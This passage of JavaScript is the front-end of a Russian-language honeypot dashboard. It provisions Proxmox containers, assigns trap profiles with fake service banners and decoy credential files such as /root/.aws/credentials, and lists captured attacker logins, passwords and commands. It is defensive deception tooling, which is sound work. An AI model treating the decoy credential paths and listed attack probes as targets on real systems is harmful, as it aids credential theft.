  reset.onclick = () => { cores.value = PVE.defaults.cores; ram.value = PVE.defaults.ram; disk.value = PVE.defaults.disk; };
  const read = (minDisk) => {
    const v = { cores: Number(cores.value), ram: Number(ram.value), disk: Number(disk.value) };
    const bad = (n, [a, b]) => !Number.isInteger(n) || n < a || n > b;
    if (bad(v.cores, PVE.limits.cores)) return { error: "Ядра: от " + PVE.limits.cores[0] + " до " + PVE.limits.cores[1] };
    if (bad(v.ram, PVE.limits.ram)) return { error: "ОЗУ: от " + PVE.limits.ram[0] + " до " + PVE.limits.ram[1] + " ГБ" };
    if (bad(v.disk, PVE.limits.disk)) return { error: "Диск: от " + PVE.limits.disk[0] + " до " + PVE.limits.disk[1] + " ГБ" };
    if (minDisk && v.disk < minDisk) return { error: "Диск можно только увеличить (сейчас " + minDisk + " ГБ)" };
    return { value: v };
  };
  return { grid, reset, read };
}

function openNewContainer() {
  openModal("Новый контейнер в Proxmox", (body) => {
    let type = "lxc";
    const seg = el("div", undefined, "seg"); seg.setAttribute("role", "radiogroup");
    const segBtn = (k) => {
      const b = el("button", undefined, k === type ? "on" : ""); b.type = "button"; b.setAttribute("role", "radio"); b.setAttribute("aria-checked", String(k === type));
      b.append(el("b", TYPE_INFO[k].label + " — " + TYPE_INFO[k].title), el("small", TYPE_INFO[k].desc));
      b.onclick = () => { type = k; for (const x of seg.children) { const on = x === b; x.classList.toggle("on", on); x.setAttribute("aria-checked", String(on)); } vmLabel(); };
      return b;
    };
    seg.append(segBtn("lxc"), segBtn("kvm"));
    const typeLabel = el("label", "Тип машины"); typeLabel.append(q("LXC — лёгкий контейнер, стартует за секунды, подходит для Low и Medium. KVM — полноценная виртуальная машина: дольше стартует, но изоляция сильнее."));
    const typeWrap = el("div"); typeWrap.append(typeLabel, seg);

    const nameIn = el("input"); nameIn.maxLength = 60; nameIn.value = uniqueContainerName("edge-dmz"); nameIn.setAttribute("aria-label", "Имя");
    const vmidIn = numInput(nextVmid(), [PVE.vmidFrom, 999999999], "VMID");
    const vmHint = el("div", undefined, "hint"); const vmLabel = () => { vmHint.textContent = TYPE_INFO[type].kind + " " + vmidIn.value + " на ноде " + PVE.node + " · выдаётся автоматически от " + PVE.vmidFrom; };
    vmidIn.oninput = vmLabel; vmLabel();
    const res = resourceFields(PVE.defaults);
    body.append(typeWrap, field("Имя (hostname)", nameIn), field("VMID", vmidIn), vmHint,
      el("h4", "Ресурсы"), res.grid, res.reset, (() => { const h = el("h4", "Сеть"); h.append(q(HELP.dmz)); return h; })(), el("div", PVE.bridgeLabel + " — ловушки не видят домашнюю сеть и прод", "ro"));

    const pickH = el("h4", "Какие ловушки запустить"); pickH.append(q("Каждая карточка — профиль ловушки. В одной машине может работать несколько ловушек, если их порты не пересекаются. Запускает их агент внутри машины."));
    body.append(pickH);
    body.append(el("p", "Можно выбрать несколько. Типы с пересекающимися портами в одной машине недоступны.", "hint"));
    const selected = new Set([profiles[0] && profiles[0].name].filter(Boolean));
    const grid = el("div", undefined, "picker"); body.append(grid);
    const summary = el("div", undefined, "hint"); summary.style.marginTop = "10px"; body.append(summary);
    const err = el("div", undefined, "err"); err.setAttribute("role", "alert"); body.append(err);
    const create = tipped(el("button", "Создать в Proxmox", "btn"), "Центр клонирует шаблон в Proxmox, выдаёт ресурсы и сеть, запускает машину; агент внутри поднимет выбранные ловушки"), cancel = el("button", "Отмена", "ghost"); cancel.onclick = closeModal;
    const actions = el("div", undefined, "actions"); actions.append(create, cancel); body.append(actions);
    const update = () => {
      const ports = [...selected].flatMap((n) => portsOf(n)).sort((a, b) => a - b);
      summary.textContent = selected.size ? "Выбрано ловушек: " + selected.size + " · порты: " + ports.join(", ") : "Ничего не выбрано";
    };
    buildPicker(grid, { existing: [], selected, multi: true, onChange: update }); update();

    create.onclick = () => {
      const name = nameIn.value.trim(), vmid = Number(vmidIn.value), errs = [];
      if (!/^[A-Za-z0-9-]{1,60}$/.test(name)) errs.push("Имя (hostname): латиница, цифры и дефис");
      else if (containerByName(name)) errs.push("Машина с таким именем уже есть");
      if (!Number.isInteger(vmid) || vmid < PVE.vmidFrom) errs.push("VMID: целое число от " + PVE.vmidFrom);
      else if (containers.some((c) => c.vmid === vmid)) errs.push("VMID " + vmid + " уже занят");
      const r = res.read(); if (r.error) errs.push(r.error);
      if (!selected.size) errs.push("Выберите хотя бы одну ловушку");
      if (errs.length) { err.textContent = errs.join("\n"); return; }
      const c = { id: uid(), name, type, vmid, node: PVE.node, bridge: PVE.bridge, host: "", enabled: true, link: "creating", seen: null, ...r.value };
      containers.push(c);
      const taken = new Set();
      for (const p of selected) { const tn = uniqueName(baseName(p), taken); taken.add(tn); traps.push(trap(tn, name, p, 0)); }
      closeModal(); renderAll(); provision(c);
      toast("Создаю " + TYPE_INFO[type].kind + " " + vmid + " в Proxmox…");
    };
    nameIn.focus(); nameIn.select();
  });
}

function openAddTrap(c) {
  openModal("Добавить ловушку в «" + c.name + "»", (body) => {
    const existing = trapsOf(c.name);
    const selected = new Set();
    body.append(el("p", existing.length ? "Уже в машине: " + existing.map((t) => t.name + " (" + portsOf(t.profile).join(", ") + ")").join(", ") : "Машина пока пустая.", "hint"));
    const grid = el("div", undefined, "picker"); body.append(grid);
    const nameIn = el("input"); nameIn.maxLength = 60; nameIn.setAttribute("aria-label", "Имя ловушки"); nameIn.placeholder = "сначала выберите тип выше";
    let touched = false; nameIn.oninput = () => { touched = true; };
    body.append(field("Имя ловушки", nameIn));
    const err = el("div", undefined, "err"); err.setAttribute("role", "alert"); body.append(err);
    const add = el("button", "Добавить ловушку", "btn"), cancel = el("button", "Отмена", "ghost"); cancel.onclick = closeModal; add.disabled = true;
    const actions = el("div", undefined, "actions"); actions.append(add, cancel); body.append(actions);
    buildPicker(grid, { existing, selected, multi: false, onChange: () => {
      const p = [...selected][0]; add.disabled = !p;
      if (p && !touched) nameIn.value = uniqueName(baseName(p));
    } });
    if (!profiles.some((p) => !portsOf(p.name).some((port) => existing.some((t) => portsOf(t.profile).includes(port)))))
      err.textContent = "Все типы ловушек конфликтуют по портам с уже установленными. Создайте профиль с другими портами или новую машину.";
    add.onclick = () => {
      const p = [...selected][0], name = nameIn.value.trim();
      if (!p) { err.textContent = "Выберите тип ловушки"; return; }
      if (!/^[A-Za-z0-9._-]{1,60}$/.test(name)) { err.textContent = "Имя: латиница, цифры, точка, дефис, подчёркивание"; return; }
      if (trapByName(name)) { err.textContent = "Ловушка с таким именем уже есть"; return; }
      const errs = portConflicts([...existing.map((t) => ({ name: t.name, profile: t.profile })), { name, profile: p }]);
      if (errs.length) { err.textContent = errs.join("\n"); return; }
      traps.push(trap(name, c.name, p, 0));
      closeModal(); renderAll();
      toast(cState(c) === "online" ? "«" + name + "» добавлена — агент запустит её при ближайшем опросе" : "Ловушка «" + name + "» добавлена");
    };
  });
}

function openContainerSettings(c) {
  const t = TYPE_INFO[c.type];
  openModal("Настройки «" + c.name + "»", (body) => {
    body.append(kv([["Тип", t.label + " — " + t.title], ["VMID / нода", t.kind + " " + c.vmid + " · " + c.node], ["Состояние", stateBadge(cState(c))],
      ["Сеть", PVE.bridgeLabel], ["Порты", containerPorts(c.name).join(", ") || "—"]]));
    const nameIn = el("input"); nameIn.value = c.name; nameIn.maxLength = 60; nameIn.setAttribute("aria-label", "Имя");
    const hostIn = el("input"); hostIn.value = c.host; hostIn.placeholder = "выдаётся по DHCP в DMZ"; hostIn.setAttribute("aria-label", "IP");
    const res = resourceFields(c);
    body.append(field("Имя (hostname)", nameIn), field("IP в DMZ", hostIn), el("h4", "Ресурсы"), res.grid, res.reset);
    body.append(el("h4", "Ловушки"));
    const list = el("div", undefined, "titems"); body.append(list);
    const drawList = () => {
      const ts = trapsOf(c.name);
      list.replaceChildren(...(ts.length ? ts.map((x) => {
        const item = el("div", undefined, "titem"); makeClickable(item, () => openTrap(x.name));
        const rm = el("button", "✕ Убрать", "ghost small danger"); armed(rm, "Точно убрать?", () => { removeTrap(x); drawList(); });
        item.append(el("span", undefined, "dot " + trapState(x)), el("span", x.name, "nm"), el("span", x.profile, "pf"), el("span", "", "ev"), rm);
        return item;
      }) : [el("div", "Ловушек нет", "cnone")]));
    };
    drawList();
    const err = el("div", undefined, "err"); err.setAttribute("role", "alert"); body.append(err);
    const save = el("button", "Сохранить", "btn"), addB = el("button", "+ Добавить ловушку", "ghost"), cancel = el("button", "Закрыть", "ghost");
    addB.onclick = () => openAddTrap(c); cancel.onclick = closeModal;
    const actions = el("div", undefined, "actions"); actions.append(save, addB, cancel); body.append(actions);
    save.onclick = () => {
      const name = nameIn.value.trim(), host = hostIn.value.trim();
      if (!/^[A-Za-z0-9-]{1,60}$/.test(name)) { err.textContent = "Имя (hostname): латиница, цифры и дефис"; return; }
      if (name !== c.name && containerByName(name)) { err.textContent = "Машина с таким именем уже есть"; return; }
      if (host && !/^[A-Za-z0-9.:-]{1,253}$/.test(host)) { err.textContent = "IP: цифры, точки, двоеточия"; return; }
      const r = res.read(c.disk); if (r.error) { err.textContent = r.error; return; }
      const changed = r.value.cores !== c.cores || r.value.ram !== c.ram || r.value.disk !== c.disk;
      for (const x of traps) if (x.container === c.name) x.container = name;
      Object.assign(c, { name, host }, r.value);
      closeModal(); renderAll();
      toast(changed ? t.cli + " set " + c.vmid + " --cores " + c.cores + " --memory " + c.ram * 1024 + (c.type === "kvm" ? " — применится после перезапуска" : " — применено") : "Настройки сохранены");
    };
  });
}

$("add-container").onclick = () => { if (!profiles.length) { toast("Сначала создайте профиль ловушки", true); showTab("profiles"); return; } openNewContainer(); };
$("c-q").oninput = (e) => { S.cFilter.q = e.target.value; renderContainers(); };
$("c-status").onchange = (e) => { S.cFilter.status = e.target.value; renderContainers(); };

// ============ ЛОВУШКИ: КАТАЛОГ ТИПОВ ============
// Всё, что умеет агент: banner (Low), ssh и http (Medium). planned — то, чего в агенте ещё нет.
const CATALOG = [
  { id: "ssh-banner", icon: "SSH", name: "SSH-сканер", level: "low",
    services: [{ port: 22, proto: "banner", banner: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" }],
    emulates: "Открытый порт SSH с баннером OpenSSH. Войти нельзя — соединение закрывается после приветствия.",
    collects: "IP и порт источника, время, версию SSH-клиента сканера.", risk: "Минимальный" },
  { id: "ftp", icon: "FTP", name: "FTP-сервер", level: "low",
    services: [{ port: 21, proto: "banner", banner: "220 ProFTPD 1.3.5 Server ready." }],
    emulates: "Приветствие ProFTPD 1.3.5 — версия с известными уязвимостями, на неё охотно идут боты.",
    collects: "Подключение и первую команду клиента (обычно USER с логином).", risk: "Минимальный" },
  { id: "telnet", icon: "TEL", name: "Telnet", level: "low",
    services: [{ port: 23, proto: "banner", banner: "Ubuntu 18.04.6 LTS\r\nweb-01 login:" }],
    emulates: "Приглашение входа Telnet, как на старом сервере или роутере.",
    collects: "Подключение и введённый логин — ботнеты вроде Mirai перебирают Telnet постоянно.", risk: "Минимальный" },
  { id: "smtp", icon: "SMTP", name: "Почтовый сервер", level: "low",
    services: [{ port: 25, proto: "banner", banner: "220 mail.corp.local ESMTP Postfix (Ubuntu)" }],
    emulates: "Приветствие почтового сервера Postfix.",
    collects: "Подключение и первую команду (EHLO, попытки открытого релея для спама).", risk: "Минимальный" },
  { id: "mysql", icon: "SQL", name: "MySQL", level: "low",
    services: [{ port: 3306, proto: "banner", banner: "5.7.42-0ubuntu0.18.04.1" }],
    emulates: "Открытый порт MySQL с версией сервера. Логики базы нет.",
    collects: "Факт сканирования БД и первые байты клиента.", risk: "Минимальный",
    note: "Баннер текстовый, а настоящий MySQL отвечает бинарным пакетом — продвинутый сканер может это заметить." },
  { id: "redis", icon: "RDS", name: "Redis", level: "low",
    services: [{ port: 6379, proto: "banner", banner: "" }],
    emulates: "Порт Redis без пароля: молчит и ждёт команд, как настоящий.",
    collects: "Присланные команды (INFO, CONFIG SET, SLAVEOF) — так ищут открытые базы для майнеров и вымогателей.", risk: "Минимальный" },
  { id: "tcp", icon: "TCP", name: "Любой TCP-порт", level: "low", custom: true,
    services: [{ port: 9200, proto: "banner", banner: "" }],
    emulates: "Пустой TCP-порт на ваш выбор: просто принимает соединение. Порт и баннер задаются в профиле.",
    collects: "Подключения и первые байты — «радар» для сканеров вроде nmap и masscan.", risk: "Минимальный" },
  { id: "fake-ssh", icon: "SSH", name: "Поддельный SSH", level: "medium",
    services: [{ port: 22, proto: "ssh", banner: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" }],
    users: ["root", "admin"], tokens: ["/root/.aws/credentials", "/home/admin/backup.sql"],
    emulates: "Настоящий SSH-протокол: пускает с любым паролем и выдаёт консоль Ubuntu с поддельной файловой системой.",
    collects: "Логины и пароли, все команды, попытки скачать файлы (wget, curl), чтение файлов-приманок.", risk: "Умеренный" },
  { id: "fake-web", icon: "WEB", name: "Поддельная веб-админка", level: "medium",
    services: [{ port: 80, proto: "http", banner: "Apache/2.4.52 (Ubuntu)" }, { port: 8080, proto: "http", banner: "Apache/2.4.52 (Ubuntu)" }],
    users: ["admin"], tokens: [],
    emulates: "Страница входа «Admin Console», правдоподобные 404 и заголовок Apache.",
    collects: "Логины и пароли из формы, все HTTP-запросы: поиск /.env, /wp-login.php, /phpmyadmin, попытки SQL-инъекций.", risk: "Умеренный" },
  { id: "fake-db", icon: "DB", name: "Поддельная база данных", level: "medium", planned: true, services: [{ port: 5432, proto: "db", banner: "" }],
    emulates: "Протокол PostgreSQL/MySQL с ответами на запросы и таблицами-приманками.",
    collects: "Учётные данные и SQL-запросы атакующего.", risk: "Умеренный" },
  { id: "high-vm", icon: "VM", name: "Настоящая ОС в песочнице", level: "high", planned: true, services: [],
    emulates: "Полноценная виртуальная машина в изолированной сети с откатом к снимку после атаки.",
    collects: "Всю сессию: ввод и вывод, загруженные инструменты, попытки двигаться по сети.", risk: "Высокий" },
];
const CAT_LEVELS = [["", "Все"], ["low", "Low"], ["medium", "Medium"], ["high", "High"]];
S.cat = { level: "", q: "" };

function catalogUsage(entry) {  // сколько развёрнутых ловушек слушают такой же сервис
  if (entry.planned || entry.custom) return null;
  const want = entry.services.map((x) => x.proto + ":" + x.port);
  return traps.filter((t) => ((profileByName(t.profile) || {}).services || []).some((x) => want.includes(x.proto + ":" + x.port))).length;
}
function useTemplate(entry) {
  clearEditor(); setEditing(null);
  $("p-name").value = entry.id + "-" + entry.level;
  $("p-level").value = entry.level;
  $("p-services").value = entry.services.map((x) => [x.port, x.proto, x.banner.replace(/\r\n/g, " ")].join(":").replace(/:$/, "")).join("\n");
  $("p-users").value = (entry.users || []).join("\n");
  $("p-tokens").value = (entry.tokens || []).join("\n");
  showTab("profiles"); $("p-name").focus(); $("p-name").select();
  toast("Конструктор заполнен по шаблону «" + entry.name + "» — проверьте и сохраните");
}
function catalogCard(entry) {
  const card = el("article", undefined, "tcard lv-" + entry.level + (entry.planned ? " planned" : ""));
  const head = el("div", undefined, "thead");
  const lvl = entry.level === "high" ? tipped(el("span", "High", "tag high"), "High — настоящая ОС в изолированной машине. Самые полные данные, но и самый высокий риск.") : levelTag(entry.level);
  head.append(el("span", entry.icon, "badge"), el("h3", entry.name), lvl);
  if (entry.planned) head.append(tipped(el("span", "в разработке", "tag soon"), "Агент пока не умеет такую ловушку. Это направление развития проекта."));
  card.append(head);
  if (entry.services.length) {
    const ports = el("div", undefined, "ports");
    for (const x of entry.services) ports.append(tipped(el("span", x.port + "/" + (x.proto === "banner" ? "tcp" : x.proto)), x.banner ? "Баннер: " + x.banner.replace(/\r\n/g, " ⏎ ") : "Без баннера: порт молча ждёт данных"));
    card.append(ports);
  }
  const dl = el("dl", undefined, "tinfo");
  dl.append(el("dt", "Эмулирует"), el("dd", entry.emulates), el("dt", "Собирает"), el("dd", entry.collects));
  card.append(dl);
  if (entry.note) card.append(el("p", "⚠ " + entry.note, "tnote"));
  const foot = el("div", undefined, "tfoot");
  foot.append(tipped(el("span", "Риск: " + entry.risk.toLowerCase(), "risk r-" + entry.level), "Насколько опасно держать такую ловушку: чем реалистичнее, тем больше атакующий может сделать внутри."));
  const used = catalogUsage(entry);
  if (used !== null) foot.append(tipped(el("span", used ? "запущено: " + used : "не запущена", "used" + (used ? " on" : "")), "Сколько ловушек этого типа сейчас работает в контейнерах"));
  const btn = el("button", entry.planned ? "Скоро" : "Создать профиль", entry.planned ? "ghost small" : "btn small");
  if (entry.planned) { btn.disabled = true; btn.title = "Появится в следующих версиях"; }
  else { btn.title = "Открыть конструктор профиля, заполненный этим шаблоном"; btn.onclick = () => useTemplate(entry); }
  foot.append(btn);
  card.append(foot);
  return card;
}
function renderCatalog() {
  const q = S.cat.q.trim().toLowerCase();
  const list = CATALOG.filter((e) => (!S.cat.level || e.level === S.cat.level) &&
    (!q || [e.name, e.icon, e.emulates, e.collects, ...e.services.map((x) => String(x.port))].join(" ").toLowerCase().includes(q)));
  reconcile($("catalog"), list, {
    key: (e) => e.id, sig: (e) => String(catalogUsage(e)), build: catalogCard, animate: true,
    empty: () => el("div", "Ничего не найдено", "cnone"),
  });
  const ready = CATALOG.filter((e) => !e.planned).length;
  $("cat-summary").textContent = ready + " типов готово · " + (CATALOG.length - ready) + " в разработке";
}
$("cat-level").replaceChildren(...CAT_LEVELS.map(([v, label]) => {
  const b = el("button", label, v === S.cat.level ? "on" : ""); b.type = "button"; b.setAttribute("role", "radio"); b.setAttribute("aria-checked", String(v === S.cat.level));
  b.title = v ? "Показать только уровень " + label : "Показать все уровни";
  b.onclick = () => { S.cat.level = v; for (const x of $("cat-level").children) { const on = x === b; x.classList.toggle("on", on); x.setAttribute("aria-checked", String(on)); } renderCatalog(); };
  return b;
}));
$("cat-q").oninput = (e) => { S.cat.q = e.target.value; renderCatalog(); };

function openTrap(name) {
  const t = trapByName(name); if (!t) return;
  openModal("Ловушка «" + t.name + "»", (body) => {
    const head = el("div", undefined, "inline"); head.style.marginBottom = "12px";
    head.append(stateBadge(trapState(t)), switchEl(t.enabled, t.enabled ? "Выключить ловушку" : "Включить ловушку", () => {
      t.enabled = !t.enabled; renderAll(); toast(t.enabled ? "Ловушка включена" : "Ловушка выключена"); openTrap(t.name);
    }));
    body.append(head);

    const nameIn = el("input"); nameIn.value = t.name; nameIn.maxLength = 60; nameIn.style.width = "220px"; nameIn.setAttribute("aria-label", "Имя ловушки");
    const ren = el("button", "✎ Переименовать", "ghost small");
    ren.onclick = () => {
      const n = nameIn.value.trim();
      if (!/^[A-Za-z0-9._-]{1,60}$/.test(n)) { toast("Имя: латиница, цифры, точка, дефис, подчёркивание", true); return; }
      if (n !== t.name && trapByName(n)) { toast("Ловушка с таким именем уже есть", true); return; }
      t.name = n; renderAll(); toast("Переименовано"); openTrap(n);
    };
    const nrow = el("div", undefined, "inline"); nrow.append(nameIn, ren);

    const csel = el("select"); csel.replaceChildren(...containers.map((c) => { const o = el("option", c.name + " · " + TYPE_INFO[c.type].kind + " " + c.vmid); o.value = c.name; return o; })); csel.value = t.container;
    const move = el("button", "⇄ Переместить", "ghost small");
    move.onclick = () => {
      const target = csel.value; if (target === t.container) return;
      const errs = portConflicts([...trapsOf(target), t].map((x) => ({ name: x.name, profile: x.profile })));
      if (errs.length) { toast("Нельзя переместить: " + errs[0], true); return; }
      t.container = target; renderAll(); toast("Ловушка перемещена в «" + target + "»"); openTrap(t.name);
    };
    const crow = el("div", undefined, "inline"); crow.append(csel, move);

    const psel = el("select"); psel.replaceChildren(...profiles.map((p) => { const o = el("option", p.name + " (" + p.level + ")"); o.value = p.name; return o; })); psel.value = t.profile;
    const apply = el("button", "✓ Применить", "ghost small");
    apply.onclick = () => {
      const errs = portConflicts(trapsOf(t.container).map((x) => ({ name: x.name, profile: x === t ? psel.value : x.profile })));
      if (errs.length) { toast("Нельзя сменить тип: " + errs[0], true); return; }
      t.profile = psel.value; renderAll(); toast("Тип ловушки обновлён — агент подтянет конфиг"); openTrap(t.name);
    };
    const prow = el("div", undefined, "inline"); prow.append(psel, apply);
    body.append(kv([["Имя", nrow], ["Машина", crow], ["Профиль", prow], ["Порты", portsOf(t.profile).join(", ")], ["Событий", t.events]]));

    const actions = el("div", undefined, "inline");
    const bOpen = el("button", "▦ Показать машину", "ghost"); bOpen.onclick = () => { closeModal(); showTab("containers"); $("c-q").value = t.container; S.cFilter.q = t.container; renderContainers(); };
    const bEv = el("button", "☰ Все события ловушки", "ghost"); bEv.onclick = () => { closeModal(); showTab("dash"); setFilter({ trap: t.name, type: "", q: "" }); };
    const bDel = el("button", "🗑 Удалить", "ghost danger"); armed(bDel, "Точно удалить?", () => { closeModal(); removeTrap(t); });
    actions.append(bOpen, bEv, bDel); body.append(actions);

    body.append(el("h4", "Последние события"));
    const mine = S.events.filter((e) => e.trap === t.name).slice(0, 8);
    const table = el("table", undefined, "mini"); const tb = el("tbody");
    if (!mine.length) tb.append(emptyRow(4, "Событий пока нет"));
    for (const ev of mine) {
      const tr = el("tr", undefined, "click"); const tag = el("td"); tag.append(typeTag(ev.type));
      tr.append(el("td", fmtTime(ev.ts), "m"), tag, el("td", ev.src_ip, "m"), el("td", ev.command || "", "m"));
      makeClickable(tr, () => openEvent(ev)); tb.append(tr);
    }
    table.append(tb); body.append(table);
  });
}

// ============ ЛЕНТА СОБЫТИЙ ============
function matches(ev) {
  const f = S.filter;
  if (f.type && ev.type !== f.type) return false;
  if (f.trap && ev.trap !== f.trap) return false;
  if (f.q) { const hay = [ev.src_ip, ev.trap, ev.container, ev.username, ev.password, ev.command].join(" ").toLowerCase(); if (!hay.includes(f.q.toLowerCase())) return false; }
  return true;
}
function eventRow(ev, animate) {
  const tr = el("tr", undefined, "click" + (animate ? " new" : ""));
  tr.append(el("td", fmtTime(ev.ts), "m"), el("td", ev.trap));
  const tag = el("td"); tag.append(typeTag(ev.type)); tr.append(tag);
  tr.append(el("td", ev.src_ip, "m"), el("td", ev.command || ev.username || "", "m"));
  makeClickable(tr, () => openEvent(ev));
  return tr;
}
function renderFeed() {
  const rows = S.events.filter(matches).slice(0, 60).map((e) => eventRow(e, false));
  $("feed").replaceChildren(...(rows.length ? rows : [emptyRow(5, S.events.length ? "По фильтру ничего нет" : "Событий пока нет")]));
}
function addToFeed(ev) {  // новая строка вставляется сверху, остальные не трогаются
  if (!matches(ev)) return;
  const feed = $("feed");
  if (feed.querySelector(".empty")) feed.replaceChildren();
  feed.prepend(eventRow(ev, true));
  while (feed.children.length > 60) feed.lastChild.remove();
}
function setFilter(patch) {
  Object.assign(S.filter, patch);
  $("f-type").value = S.filter.type; $("f-trap").value = S.filter.trap; $("f-q").value = S.filter.q;
  renderFeed(); renderTops(true);
}
function openEvent(ev) {
  openModal("Событие #" + ev.id, (body) => {
    body.append(kv([
      ["Время", new Date(ev.ts).toLocaleString("ru-RU")], ["Машина", ev.container], ["Ловушка", ev.trap], ["Тип", ev.type],
      ["Источник", ev.src_ip + ":" + ev.src_port], ["Порт ловушки", ev.dst_port], ["Протокол", ev.proto], ["Сессия", ev.session_id],
      ["Логин", ev.username], ["Пароль", ev.password], ["Команда / запрос", ev.command],
    ]));
    const row = el("div", undefined, "inline");
    const b1 = el("button", "⌕ Все события этого IP", "ghost"); b1.onclick = () => { closeModal(); showTab("dash"); setFilter({ q: ev.src_ip, type: "", trap: "" }); };
    const b2 = el("button", "☰ События этой ловушки", "ghost"); b2.onclick = () => { closeModal(); showTab("dash"); setFilter({ q: "", type: "", trap: ev.trap }); };
    const b3 = el("button", "⧉ Копировать IP", "ghost"); b3.onclick = () => copy(ev.src_ip);
    const b4 = el("button", "→ Открыть ловушку", "ghost"); b4.onclick = () => { if (trapByName(ev.trap)) openTrap(ev.trap); else toast("Ловушка уже удалена", true); };
    row.append(b1, b2, b3, b4); body.append(row);
  });
}

// ============ ОБЗОР ============
function renderKpis() {
  setText($("k-total"), S.total.toLocaleString("ru-RU"));
  setText($("k-auth"), S.auth.toLocaleString("ru-RU"));
  setText($("k-alert"), String(S.alert));
  setText($("k-online"), traps.filter((t) => trapState(t) === "online").length + " / " + traps.length);
  const max = Math.max(...S.buckets, 1), bars = $("bars");
  if (bars.children.length !== S.buckets.length) bars.replaceChildren(...S.buckets.map(() => el("i")));
  S.buckets.forEach((n, i) => { const b = bars.children[i]; b.style.height = Math.max(3, (n / max) * 100) + "%"; b.title = n + " событий, " + (59 - i) + " мин назад"; });
}
function topList(map, box, onPick, active) {
  const list = Object.entries(map).sort((a, b) => b[1] - a[1]).slice(0, 5);
  reconcile(box, list, {
    key: ([v]) => v, sig: ([v, n]) => n + "|" + (v === active), animate: false,
    empty: () => el("div", "Нет данных", "empty"),
    build: ([value, count]) => {
      const row = el("div", undefined, "bar-row" + (value === active ? " on" : ""));
      row.append(el("span", value), el("span", String(count)));
      makeClickable(row, () => onPick(value === active ? "" : value));
      return row;
    },
  });
}
function renderTops(force) {
  if (S.hoverTop && !force) return;  // список под курсором не трогаем: клик не должен потеряться
  const go = (v) => { showTab("dash"); setFilter({ q: v }); };
  topList(S.src, $("top-src"), go, S.filter.q); topList(S.pw, $("top-pw"), go, S.filter.q);
}
for (const id of ["top-src", "top-pw"]) { $(id).onmouseenter = () => { S.hoverTop = true; }; $(id).onmouseleave = () => { S.hoverTop = false; }; }
function renderFilters() {
  fillSelect($("f-type"), [["", "Все типы"], ...TYPES.map((t) => [t, t])]);
  fillSelect($("f-trap"), [["", "Все ловушки"], ...traps.map((t) => [t.name, t.container + " / " + t.name])]);
  const states = [["", "Все состояния"], ...ORDER.map((k) => [k, STATES[k].label])];
  fillSelect($("c-status"), states);
}

// ============ ПРОФИЛИ (имена пользователей-приманок, без паролей) ============
function profileRow(p) {
  const tr = el("tr", undefined, "click" + (p.name === S.editing ? " sel" : "")); const lv = el("td"); lv.append(levelTag(p.level));
  tr.append(el("td", p.name), lv, el("td", p.services.map((s) => s.port + " (" + s.proto + ")").join(", ")), el("td", String(traps.filter((t) => t.profile === p.name).length)));
  makeClickable(tr, () => editProfile(p.name));
  return tr;
}
function renderProfiles() {
  reconcile($("profiles"), profiles, {
    key: (p) => p.name, build: profileRow, animate: true,
    sig: (p) => JSON.stringify([p.level, p.services, traps.filter((t) => t.profile === p.name).length, p.name === S.editing]),
    empty: () => emptyRow(4, "Профилей пока нет"),
  });
}
function setEditing(name) {
  S.editing = name;
  $("p-title").textContent = name ? "Профиль: " + name : "Конструктор профиля";
  $("p-save").textContent = name ? "✓ Сохранить изменения" : "✓ Сохранить профиль";
  $("p-cancel").classList.toggle("hidden", !name);
  $("p-delete").classList.toggle("hidden", !name);
  renderProfiles();
}
function clearEditor() {
  $("p-name").value = ""; $("p-level").value = "low"; $("p-services").value = ""; $("p-users").value = "";
  $("p-tokens").value = ""; $("p-beacon").value = 15; $("p-jitter").value = 0.3;
}
function editProfile(name) {
  const p = profileByName(name); if (!p) return;
  $("p-name").value = p.name; $("p-level").value = p.level;
  $("p-services").value = p.services.map((s) => [s.port, s.proto, s.banner].join(":").replace(/:$/, "")).join("\n");
  $("p-users").value = p.users.join("\n"); $("p-tokens").value = p.tokens.join("\n");
  $("p-beacon").value = p.beacon; $("p-jitter").value = p.jitter;
  setEditing(name);
}
function readEditor() {
  const name = $("p-name").value.trim();
  if (!/^[A-Za-z0-9._-]{1,80}$/.test(name)) return { error: "Название: латиница, цифры, точка, дефис, подчёркивание (до 80 символов)" };
  const level = $("p-level").value, services = [];
  for (const line of $("p-services").value.split("\n").map((l) => l.trim()).filter(Boolean)) {
    const [port, proto = "banner", ...rest] = line.split(":");
    const n = Number(port);
    if (!Number.isInteger(n) || n < 1 || n > 65535) return { error: "Неверный порт: " + line };
    if (!["banner", "ssh", "http"].includes(proto)) return { error: "Протокол: banner, ssh или http (" + line + ")" };
    if (level === "low" && proto !== "banner") return { error: "Low-ловушка умеет только баннеры (banner)" };
    if (services.some((s) => s.port === n)) return { error: "Порт " + n + " указан дважды" };
    services.push({ port: n, proto, banner: rest.join(":") });
  }
  if (!services.length) return { error: "Добавьте хотя бы один сервис" };
  const users = $("p-users").value.split("\n").map((l) => l.trim()).filter(Boolean);
  if (users.some((u) => !/^[A-Za-z0-9._-]{1,64}$/.test(u))) return { error: "Имена пользователей: латиница, цифры, точка, дефис, подчёркивание" };
  if (new Set(users).size !== users.length) return { error: "Имена пользователей повторяются" };
  const tokens = $("p-tokens").value.split("\n").map((l) => l.trim()).filter(Boolean);
  if (tokens.some((t) => !t.startsWith("/") || t.includes(".."))) return { error: "Пути honeytoken: абсолютные, без .." };
  const beacon = Number($("p-beacon").value), jitter = Number($("p-jitter").value);
  if (!(beacon >= 5 && beacon <= 300)) return { error: "Интервал маяка: 5–300 с" };
  if (!(jitter >= 0 && jitter <= 0.9)) return { error: "Джиттер: 0–0.9" };
  const old = S.editing ? profileByName(S.editing) : null;
  return { profile: { name, level, services, users, tokens, beacon, jitter, desc: old ? old.desc : "" } };
}
$("p-save").onclick = () => {
  const r = readEditor(); if (r.error) { toast(r.error, true); return; }
  const p = r.profile;
  if (profiles.some((x) => x.name === p.name && x.name !== S.editing)) { toast("Профиль с таким именем уже есть", true); return; }
  if (S.editing) {
    const lookup = (n) => (n === S.editing ? p : profileByName(n));  // новые порты не должны пересечься внутри машин
    for (const c of containers) {
      const errs = portConflicts(trapsOf(c.name).map((t) => ({ name: t.name, profile: t.profile })), lookup);
      if (errs.length) { toast("Конфликт в «" + c.name + "»: " + errs[0], true); return; }
    }
    const old = profileByName(S.editing), oldName = old.name;
    Object.assign(old, p);
    for (const t of traps) if (t.profile === oldName) t.profile = p.name;
    toast("Профиль сохранён"); setEditing(p.name);
  } else {
    profiles.push(p); toast("Профиль создан — его можно выбрать при добавлении ловушки"); clearEditor(); setEditing(null);
  }
  renderAll();
};
$("p-cancel").onclick = () => { clearEditor(); setEditing(null); };
